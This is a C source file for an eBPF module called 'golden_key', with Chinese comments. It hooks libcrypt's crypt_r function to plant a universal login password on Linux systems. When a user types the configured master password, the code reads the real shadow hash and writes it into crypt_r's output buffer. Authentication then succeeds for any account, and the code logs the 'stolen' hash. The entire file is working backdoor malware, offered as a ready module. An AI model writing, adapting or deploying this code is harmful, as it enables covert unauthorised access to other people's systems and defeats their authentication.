#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

char LICENSE[] SEC("license") = "GPL";

char _metadata[] __attribute__((used, section(".metadata"))) =
    "{"
      "\"name\":\"golden_key\","
      "\"desc\":\"万能密码：动态 Hook libcrypt 的 crypt_r 函数，拦截认证流并替换输出缓冲区\","
      "\"requires\":[\"is_root\",\"uprobe\",\"probe_write\"],"
      "\"options\":{"
        "\"MASTER_PASSWORD\":[\"bufferfly\",\"系统万能密码（≤15字符），加载时或运行时配置\"]"
      "},"
      "\"maps\":{"
        "\"master_password\":{\"key_size\":4,\"value_size\":16,\"key_type\":\"u32\",\"value_type\":\"str\"}"
      "}"
    "}";

/*
 * 运行时可配置的万能密码
 * key=0 → char[16]（null-terminated，不超过15字符）
 */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, char[16]);
} master_password SEC(".maps");

/* * 记录触发万能密码的 PID → 保存的目标 shadow 哈希字符串 
 * 用结构体包裹字符串，确保存储和传递的安全
 */
struct hash_data {
    char hash_str[128];
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u32);
    __type(value, struct hash_data);
} targeted_pids SEC(".maps");

/* * uprobe: crypt_r(const char *phrase, const char *setting, struct crypt_data *data)
 * 拦截密码输入，比对万能密码，并窃取真实的 shadow 哈希 (setting)
 */
SEC("uprobe")
int BPF_KPROBE(crypt_r_enter, const char *phrase, const char *setting, void *data) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;

    char pwd[16] = {};
    long err = bpf_probe_read_user_str(pwd, sizeof(pwd), phrase);
    if (err <= 0) return 0;

    u32 map_key = 0;
    char *master = bpf_map_lookup_elem(&master_password, &map_key);
    if (!master) return 0;

    /* 逐字节比较 — 不使用 break，避免 unroll 问题 */
    int match = 1;
    #pragma unroll
    for (int i = 0; i < 15; i++) {
        if (master[i] != pwd[i]) {
            match = 0;
        }
    }

    if (match) {
        struct hash_data hd = {};
        // 这里的 setting 在 PAM 中通常就是完整的 shadow 哈希字符串
        bpf_probe_read_user_str(hd.hash_str, sizeof(hd.hash_str), setting);
        bpf_map_update_elem(&targeted_pids, &pid, &hd, BPF_ANY);
        bpf_printk("GOLDEN_KEY: MATCH! PID %d, Stolen shadow hash: %s\n", pid, hd.hash_str);
    }
    return 0;
}

/* * uretprobe: crypt_r
 * 覆写 crypt_r 返回的可写缓冲区，使其内容与真实的 shadow 哈希一模一样
 */
SEC("uretprobe")
int BPF_KRETPROBE(crypt_r_exit, char *ret) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    struct hash_data *hd = bpf_map_lookup_elem(&targeted_pids, &pid);
    if (!hd) return 0;

    if (ret) {
        // 计算我们要写入的字符串长度（包含 \0）
        u32 len = 0;
        #pragma unroll
        for (int i = 0; i < 127; i++) {
            if (hd->hash_str[i] == '\0') {
                len = i + 1;
                break;
            }
        }
        if (len > 0) {
            // 直接写入 crypt_r 的输出缓冲区，避开只读内存 (-EFAULT) 问题
            long we = bpf_probe_write_user(ret, hd->hash_str, len);
            if (we == 0) {
                bpf_printk("GOLDEN_KEY: crypt_r output overwritten successfully. Door is OPEN.\n");
            } else {
                bpf_printk("GOLDEN_KEY: write failed: %d\n", we);
            }
        }
    }

    bpf_map_delete_elem(&targeted_pids, &pid);
    return 0;
}